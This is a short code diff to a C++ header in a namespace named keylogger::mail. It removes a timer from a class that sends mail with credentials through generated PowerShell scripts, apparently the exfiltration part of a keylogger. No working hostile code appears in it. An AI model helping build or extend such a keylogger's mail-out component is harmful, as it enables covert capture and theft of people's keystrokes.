@@ -8,7 +8,6 @@
 #include "DefaultFileSystemAccess.h"
 #include "PowerShellSendMailScriptCreator.h"
 #include "Helper.h"
-#include "Timer.h"
 #include "MailSender.h"
 
 namespace keylogger::mail
@@ -21,7 +20,6 @@ public:
     bool sendMail(const Mail&, const Credentials&) override;
 
 private:
-    Timer timer;
     std::unique_ptr<PowerShellSendMailScriptCreator> scriptCreator;
 };
 }
